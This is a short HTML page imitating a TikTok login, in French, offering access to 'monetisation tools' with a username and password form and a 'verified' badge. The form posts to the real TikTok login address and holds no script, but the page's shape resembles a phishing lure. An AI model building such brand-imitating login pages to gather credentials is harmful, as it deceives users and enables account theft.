<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login Center</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-center {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        .login-center h1 {
            color: #333;
        }
        .login-center p {
            color: #666;
        }
        .login-form {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .login-form input {
            padding: 10px;
            margin: 10px 0;
            width: 100%;
            max-width: 300px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .login-button {
            display: inline-block;
            padding: 10px 20px;
            background-color: #25f4ee;
            color: #fff;
            border-radius: 5px;
            text-decoration: none;
            font-weight: bold;
            margin-top: 10px;
        }
        .badge {
            display: inline-block;
            background-color: #1da1f2;
            color: #fff;
            padding: 5px 10px;
            border-radius: 5px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-center">
        <h1>TikTok Monétisation</h1>
        <p>Connectez-vous pour accéder à vos outils de monétisation.</p>
        <form class="login-form" action="https://www.tiktok.com/login" method="post">
            <input type="text" name="username" placeholder="Nom d'utilisateur" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit" class="login-button">Se Connecter</button>
        </form>
        <div class="badge">Vérifié</div>
    </div>
</body>
</html>
